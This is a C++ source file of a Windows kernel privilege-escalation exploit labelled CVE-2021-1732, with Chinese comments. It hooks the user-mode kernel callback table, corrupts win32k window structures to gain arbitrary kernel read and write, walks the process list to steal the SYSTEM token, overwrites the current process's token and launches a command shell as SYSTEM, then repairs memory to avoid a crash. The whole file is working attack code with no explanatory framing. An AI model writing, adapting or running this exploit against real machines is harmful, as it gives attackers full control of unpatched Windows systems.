#include "exp.hpp"
#include "def.hpp"
#include "include/common/gadget.hpp"
#include "include/common/memtools.hpp"
#include <vector>
#include <tlhelp32.h>
namespace offset = exploit::gadget::X_17763_737;
namespace CVE_2021_1732
{
    void arbitryRead0x10Size(ULONG_PTR pAddr, ULONG_PTR& valLow, ULONG_PTR& valHigh)
    {
        MENUBARINFO mbi = { 0 };
        mbi.cbSize = sizeof(MENUBARINFO);

        RECT Rect = { 0 };
        GetWindowRect(g_HWNDs[1], &Rect);

        *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x58)) = pAddr - 0x40; //0x44 xItem
        GetMenuBarInfo(g_HWNDs[1], -3, 1, &mbi);

        BYTE pbKernelValue[16] = { 0 };
        *(DWORD*)(pbKernelValue) = mbi.rcBar.left - Rect.left;
        *(DWORD*)(pbKernelValue + 4) = mbi.rcBar.top - Rect.top;
        *(DWORD*)(pbKernelValue + 8) = mbi.rcBar.right - mbi.rcBar.left;
        *(DWORD*)(pbKernelValue + 0xc) = mbi.rcBar.bottom - mbi.rcBar.top;

        valLow = *(ULONG_PTR*)(pbKernelValue);
        valHigh = *(ULONG_PTR*)(pbKernelValue + 8);
    }

    bool Exp() {

        if (!initAPI())
            return false;

        // 进行hook user!xxxClientAllocWindowClassExtraBytes
        printf("+----------- Setup Hook -------------\n");
        auto pPEB = __readgsqword(0x60);
        auto pKernelCallbackTable = *(PULONG_PTR*)(pPEB + 0x58);
        orign_xxxClientAllocWindowClassExtraBytes = (FxxxClientAllocWindowClassExtraBytes)pKernelCallbackTable[123];
        printf("[+] Kernel Callback Table at: 0x%p\n[+] user!xxxClientAllocWindowClassExtraBytes at 0x%p\n[+] New MyxxxClientAllocWindowClassExtraBytes: 0x%p\n", pKernelCallbackTable, orign_xxxClientAllocWindowClassExtraBytes, MyxxxClientAllocWindowClassExtraBytes);
        DWORD oldProtect;
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
        pKernelCallbackTable[123] = reinterpret_cast<ULONG_PTR>(MyxxxClientAllocWindowClassExtraBytes);
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, oldProtect, &oldProtect);

        // 注册两种类别的窗口类
        WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"TypeA", nullptr };
        wc.cbSize = sizeof(WNDCLASSEX);
        wc.cbWndExtra = sizeof(LONG_PTR);

        ::RegisterClassExW(&wc);
        wc.lpszClassName = L"TypeB";
        wc.cbWndExtra = magicExtra;
        ::RegisterClassExW(&wc);

        HMENU hMenu = NULL, hHelpMenu = NULL;

        for (size_t i = 0; i < 0x30; i++)
        {
            if (i == 0 || i == 1) { // if is tagWNDK_1, create a menu
                hMenu = CreateMenu();
                hHelpMenu = CreateMenu();

                AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about"));    // 准备一个 Item
                AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help"));    // 为菜单添加 Item
            }
            HWND temp = CreateWindowExW(0, L"TypeA", L"wndexp", WS_DISABLED,
                CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
                NULL, hMenu, wc.hInstance, NULL);
            hMenu = NULL;
            g_HWNDs.push_back(temp);
            PVOID tempPVoid = HMValidateHandle(temp, 1);
            g_HWNDKs.push_back(tempPVoid);
        }

        for (size_t i = 2; i < 0x30; i++) {
            DestroyWindow(g_HWNDs[i]);
        }

        // 判断1，2之间的关系
        printf("+----------- set tagWNDK_0 into desktop heap base offset -------------\n");
        printf("[+] tagWNDK_0's HWND: 0x%X, tagWNDK_0's extraFlag: 0x%X\n", g_HWNDs[0], *reinterpret_cast<DWORD*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::dwExtraFlag)));
        ULONG_PTR ChangeOffset = 0;
        ULONG_PTR ConsoleCtrlInfo[2] = { 0 };
        ConsoleCtrlInfo[0] = (ULONG_PTR)g_HWNDs[0]; // 第一个参数需要为窗口句柄
        ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;
        NTSTATUS ret = NtUserConsoleControl(6, reinterpret_cast<ULONG_PTR>(&ConsoleCtrlInfo), sizeof(ConsoleCtrlInfo));
        if (!NT_SUCCESS(ret)) {
            printf("[x] Call NtUserConsoleControl failed\n");
            return false;
        }
        else
            printf("[+] tagWNDK_0's extraFlag: 0x%X, tagWNDK_0's cbWndExtra: 0x%X\n",
                *reinterpret_cast<DWORD*>(
                    (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::dwExtraFlag)),
                *reinterpret_cast<DWORD*>(
                    (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::cbWndExtra))
            );
        tag0_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
        tag1_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[1]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
        tag0_extraByteAddr = *reinterpret_cast<ULONG_PTR*>( // 得到 tagWNDK_0->pExtraByte 便于后续计算偏移
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::pExtraByte));
        printf("[+] tagWNDK_0's pExtraByte: 0x%p, tagWNDK_2's Offset: 0x%p\n", tag0_extraByteAddr, tag1_reverseBaseOffset);
        if (tag0_extraByteAddr > tag1_reverseBaseOffset) {
            printf("[x] Memory layout failed\n");
            return false;
        }


        HWND hwnd2 = CreateWindowExW(0, L"TypeB", L"wndexp",
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
            CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
        g_HWNDKs[2] = HMValidateHandle(hwnd2, 1);
        // printf("[+] HWNDs: %X, %X, %X\n", g_HWNDs[0], g_HWNDs[1], choosenOne);
        SetWindowLongPtr(choosenOne, offset::tagWND::tagWNDK::cbWndExtra, 0x0fffffff);
        printf("[+] tagWNDK_0's cbWndExtra: 0x%p\n", *reinterpret_cast<ULONG_PTR*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::cbWndExtra)));

        printf("+----------- setup for arbitry read -------------\n");
        ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_HWNDKs[1] + offset::tagWND::tagWNDK::dwStyle);
        ululStyle |= 0x4000000000000000L; // add WS_CHILD to tagWNDk1.dwStyle

        SetWindowLongPtr(g_HWNDs[0],
            (tag1_reverseBaseOffset - tag0_extraByteAddr) + offset::tagWND::tagWNDK::dwStyle,
            ululStyle);  // modify tagWNDk1.dwStyle

        g_fakeMenu = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0xA0);
        *(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x98) = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x20);
        **(ULONG_PTR**)((PBYTE)g_fakeMenu + 0x98) = g_fakeMenu;
        *(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x28) = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x200);
        *(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x58) = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x8); //rgItems 1
        *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x28) + 0x2C) = 1; //cItems 1
        *(DWORD*)((PBYTE)g_fakeMenu + 0x40) = 1;
        *(DWORD*)((PBYTE)g_fakeMenu + 0x44) = 2;
        *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x58)) = 0x4141414141414141;

        ULONG_PTR pSPMenu = SetWindowLongPtr(g_HWNDs[1], GWLP_ID, (LONG_PTR)g_fakeMenu); // change tagWNDK_1->spMenu

        ululStyle &= ~0x4000000000000000L;// recovery dwStyle
        SetWindowLongPtr(g_HWNDs[0],
            (tag1_reverseBaseOffset - tag0_extraByteAddr) + offset::tagWND::tagWNDK::dwStyle,
            ululStyle);  // modify tagWNDk1.dwStyle
        printf("[+] tagWNDK_1 pSPMenu a: 0x%p\n", pSPMenu);


        printf("+----------- leak kernel info -------------\n");
        ULONG_PTR low = 0, high = 0;
        ULONG_PTR currentEprocess = 0, currentTokenAddr = 0, systemEprocess = 0, systemTokenVal = 0;
        arbitryRead0x10Size(pSPMenu + offset::tagWND::spMenu::unknown0, low, high);
        arbitryRead0x10Size(low + offset::tagWND::spMenu::Unknown0::unknown00, low, high);
        arbitryRead0x10Size(low + offset::tagWND::spMenu::Unknown0::Unknown00::eprocess, low, high);
        currentEprocess = low;
        currentTokenAddr = currentEprocess + offset::EPROCESS::Token;


        ULONG_PTR pidLong = 0;
        DWORD pid = 0;
        DWORD currentPid = GetCurrentProcessId();
        for (size_t i = 0; i < 500; i++)
        {
            arbitryRead0x10Size(low + offset::EPROCESS::UniqueProcessId, pidLong, high);
            pid = pidLong;
            if (pid == 4) {
                systemEprocess = low;
                arbitryRead0x10Size(low + offset::EPROCESS::Token, systemTokenVal, high);
                break;
            }
            else if (pid == currentPid) { //重新寻找真的EProcess
                currentEprocess = low;
                currentTokenAddr = currentEprocess + offset::EPROCESS::Token;
            }
            arbitryRead0x10Size(low + offset::EPROCESS::ActiveProcessLinks, low, high);
            low -= offset::EPROCESS::ActiveProcessLinks;
        }
        systemTokenVal &= 0xfffffffffffffff0;
        printf("[+] current Eprocess: 0x%p, current Token Addr: 0x%p\n[+] System Eprocess: 0x%p, System Token value: 0x%p\n",
            currentEprocess, currentTokenAddr, systemEprocess, systemTokenVal);
        if (systemEprocess) {
            LONG_PTR old = SetWindowLongPtr(
                g_HWNDs[0],
                tag1_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::pExtraByte,
                (LONG_PTR)currentTokenAddr);//1.设置tagWNDK_1->pExtraByte为当前进程Eprocess token的地址
            printf("[debug] old: 0x%p\n", old);
            SetWindowLongPtr(g_HWNDs[1], 0, (LONG_PTR)systemTokenVal); //设置正常tagWNDK_1->pExtraByte为system token值
            SetWindowLongPtr(g_HWNDs[0], tag1_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::pExtraByte, old); //恢复tagWNDK_1->pExtraByte
            system("cmd");
        }

    clean:
        //--------- Recovery Part -------------
        printf("+----------- clean memory to avoid BSOD -------------\n");
        printf("[*] remove hook\n");
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
        pKernelCallbackTable[123] = reinterpret_cast<ULONG_PTR>(orign_xxxClientAllocWindowClassExtraBytes);
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, oldProtect, &oldProtect);

        g_HWNDKs[2] = HMValidateHandle(choosenOne, 1);
        tag2_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[2]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
        if (tag0_extraByteAddr < tag2_reverseBaseOffset) {
            printf("[*] repair tagWNDK_2\n");
            // 恢复tagWNDK_2的信息
            DWORD dwFlag = *(ULONGLONG*)((PBYTE)g_HWNDKs[2] + offset::tagWND::tagWNDK::dwExtraFlag);
            dwFlag &= ~0x800;
            SetWindowLongPtr(g_HWNDs[0], tag2_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::dwExtraFlag, dwFlag);  //Modify remove flag
            printf("[*] tagWNDK_2->dwExtraFlag: %X\n", *reinterpret_cast<ULONG_PTR*>(
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[2]) + offset::tagWND::tagWNDK::dwExtraFlag)));

            PVOID pAlloc = RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, magicExtra);
            SetWindowLongPtr(g_HWNDs[0], tag2_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset, (LONG_PTR)pAlloc);  //Modify offset to memory address
            printf("[*] tagWNDK_2->KernelDesktopHeapBaseOffset: 0x%p == 0x%p\n", *reinterpret_cast<ULONG_PTR*>(
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[2]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset)), pAlloc);

            // 恢复tagWNDK_1的信息
            printf("[*] repair tagWNDK_1\n");
            ululStyle = *reinterpret_cast<ULONG_PTR*>(
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[1]) + offset::tagWND::tagWNDK::dwStyle));
            ululStyle |= 0x4000000000000000L;//WS_CHILD
            SetWindowLongPtr(g_HWNDs[0], tag1_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::dwStyle, ululStyle);  //Modify add style WS_CHILD
            printf("[*] tagWNDK_1->fake_menu style: 0x%p\n", ululStyle);
            ULONG_PTR pMyMenu = SetWindowLongPtr(g_HWNDs[1], GWLP_ID, (LONG_PTR)pSPMenu); //复原 pSpMenu
            //free pMyMenu
            ululStyle &= ~0x4000000000000000L;//WS_CHILD
            SetWindowLongPtr(g_HWNDs[0], tag1_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::dwStyle, ululStyle);  //Modify Remove Style WS_CHILD
            printf("[*] tagWNDK_1->real_menu style: 0x%p\n", ululStyle);
        }

        DestroyWindow(g_HWNDs[0]);
        DestroyWindow(g_HWNDs[1]);
        DestroyWindow(choosenOne);

        return true;
    }


} // namespace CVE_2021_1732